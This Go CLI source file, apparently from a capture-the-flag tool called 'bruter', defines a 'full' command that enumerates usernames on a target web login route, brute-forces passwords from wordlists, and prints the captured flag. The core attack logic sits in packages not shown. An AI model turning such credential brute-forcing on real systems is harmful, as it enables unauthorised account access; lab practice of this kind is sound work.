/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"bruter/shared"
	"bruter/structs/attacker"
	"bruter/structs/enumerator"
	"fmt"
	"log"

	"github.com/spf13/cobra"
)

// fullCmd represents the full command
var fullCmd = &cobra.Command{
	Use:   "full",
	Short: "conduct full attack",
	Long:  `this option carries out both the username enumeration and password brute-force.`,
	Run: func(cmd *cobra.Command, args []string) {
		var aobj *attacker.Attacker
		var content []byte
		var eobj *enumerator.Enumerator
		var err error
		var flagval string
		var firstuser bool
		var found bool = false
		var likelies []string
		var likely string
		var passlist string
		var route string
		var scheme string
		var secure bool
		var target string
		var userlist string

		userlist, err = cmd.Flags().GetString("userlist")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		passlist, err = cmd.Flags().GetString("passlist")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		target, err = cmd.Flags().GetString("target")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		route, err = cmd.Flags().GetString("route")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		secure, err = cmd.Flags().GetBool("secure")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		firstuser, err = cmd.Flags().GetBool("first-user")
		if err != nil {
			log.Panicf("error parsing args: %s\n", err.Error())
		}

		if secure {
			scheme = "https"
		} else {
			scheme = "http"
		}

		fmt.Printf("Userlist: %s\n", userlist)
		fmt.Printf("Passlist: %s\n", passlist)
		fmt.Printf("Target: %s\n", target)
		fmt.Printf("Route: %s\n", route)
		fmt.Printf("\n")

		eobj, err = enumerator.NewEnumerator(
			enumerator.WithRoute(route),
			enumerator.WithTargetIP(target),
			enumerator.WithWordlist(userlist),
			enumerator.WithScheme(scheme),
			enumerator.FindOne(firstuser),
		)
		if err != nil {
			log.Panicf("error initializing enumerator: %s\n", err.Error())
		}

		aobj, err = attacker.NewAttacker(
			attacker.WithRoute(route),
			attacker.WithTargetIP(target),
			attacker.WithWordlist(passlist),
			attacker.WithScheme(scheme),
		)
		if err != nil {
			log.Panicf("error initializing attacker: %s\n", err.Error())
		}

		likelies, err = eobj.Enumerate()
		if err != nil {
			log.Panicf("%s\n", err.Error())
		}

		if len(likelies) < 1 {
			log.Panicf("no users found\n")
		}

		for _, likely = range likelies {
			aobj.Username = likely
			_, content, err = aobj.Attack()
			if err != nil {
				continue
			}
			found = true
		}

		if !found {
			log.Panicf("no valid credentials discovered\n")
		}

		flagval, err = shared.ReadFlag(content)
		if err != nil {
			log.Panicf(err.Error())
		}

		fmt.Printf("\nFlag: %s\n", flagval)
	},
}

func init() {
	rootCmd.AddCommand(fullCmd)
	fullCmd.Flags().StringP("userlist", "u", "usernames.txt", "wordlist containing possible usernames")
	fullCmd.Flags().StringP("passlist", "p", "passwords.txt", "wordlist containing possible passwords")
	fullCmd.Flags().Bool("first-user", false, "stop enumerating users after finding one username")
}
